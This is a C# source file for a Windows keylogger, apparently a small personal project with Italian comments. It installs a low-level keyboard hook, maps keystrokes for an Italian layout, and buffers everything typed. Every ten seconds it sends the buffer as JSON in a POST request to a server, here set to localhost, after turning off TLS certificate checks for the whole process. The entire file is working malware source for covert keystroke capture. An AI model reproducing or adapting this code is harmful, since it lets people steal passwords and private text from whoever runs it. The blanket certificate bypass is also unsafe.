using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Runtime.Serialization;


namespace keylogger
{
	internal class Program
	{
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("user32.dll")]
		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		private static readonly HttpClient client = new HttpClient();

		private static int WH_KEYBOARD_LL = 13;
		private static int WM_KEYDOWN = 0x100;
		private static int WM_SYSKEYDOWN = 0x104;

		public static void Main(string[] args)
		{
			HookCallbackDelegate hcDelegate = HookCallback;

			string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
			IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

			System.Windows.Forms.Application.Run();

		}

		private static int wordCounter = 0;
		private static DateTime lastSaveTime = DateTime.Now;
		private static string actualString = "";
		private static Dictionary<string, string> dizionario = new Dictionary<string, string>
		{
			{"D0", "0"},
			{"D1", "1"},
			{"D2", "2"},
			{"D3", "3"},
			{"D4", "4"},
			{"D5", "5"},
			{"D6", "6"},
			{"D7", "7"},
			{"D8", "8"},
			{"D9", "9"},
			{"Enter", "\n"},
			{"Space", " "},
			{"Oem4", "'" },
			{"Oem6", "ì" },
			{"OemSemicolon", "è" },
			{"Oemplus", "+" },
			{"Oem3", "ò" },
			{"Oem7", "à" },
			{"Oem2", "ù" },
			{"Oemcomma", "," },
			{"OemPeriod", "." },
			{"OemMinus", "-" },
			{"OemBackslash", "<" },
			{"OemPipe", "'\\'" },
			{"RShiftKey", "[shift]" },
            {"LShiftKey", "[shift]" },
        };
		
        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			
			if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
			{
				int vkCode = Marshal.ReadInt32(lParam);
                InsertKey(vkCode);
                if ((DateTime.Now - lastSaveTime).TotalSeconds >= 10)
				{
					saveLog();
					Console.WriteLine("son qua");				   
					lastSaveTime = DateTime.Now;
					actualString = "";
				}
				
			}
			return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
		}

		private static void saveLog()
		{
            var jsonData = new
            {
                title = "Latest Read",
                text = actualString // Si suppone che qui si inserisca una stringa reale da inviare
            };

            string url = "https://127.0.0.1:8443/sendUpdates";

            // Ignora la verifica del certificato SSL
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

            using (WebClient client = new WebClient())
            {
				try
				{
					client.Headers[HttpRequestHeader.ContentType] = "application/json";

					// Converti l'oggetto JSON in una stringa
					string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);

					// Invia la richiesta POST
					string response = client.UploadString(url, "POST", jsonString);
				}
                catch (WebException ex)
                {
					// Handle WebExceptions (network errors, server responses, etc.)
					Console.WriteLine(ex.ToString());
                }
                catch (SerializationException ex)
                {
                    Console.WriteLine(ex.ToString());
                }
                catch (Exception ex)
                {
                    // Handle other unexpected exceptions
                    Console.WriteLine(ex.ToString());
                }
            }
        }

		private static void InsertKey(int vkCode)
		{

			if (dizionario.ContainsKey($"{(Keys)vkCode}"))
				actualString += dizionario[$"{(Keys)vkCode}"];
			else
			{
				if ($"{(Keys)vkCode}" == "Back")
				{
					if (!string.IsNullOrEmpty(actualString))
						actualString = actualString.Remove(actualString.Length - 1);	
				}
				else
				{
					actualString += $"{(Keys)vkCode}";
				}
			}
			
			

			
			Console.WriteLine(actualString);
		}

        private static bool checkShifted()
        {
            if (string.IsNullOrEmpty(actualString))
                return false;

            int shiftIndex = actualString.IndexOf("[shift]", Math.Max(0, actualString.Length - 7));
            if (shiftIndex >= 0)
            {
                actualString = actualString.Remove(shiftIndex, 7);
                return true;
            }

            return false;
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

	}
}
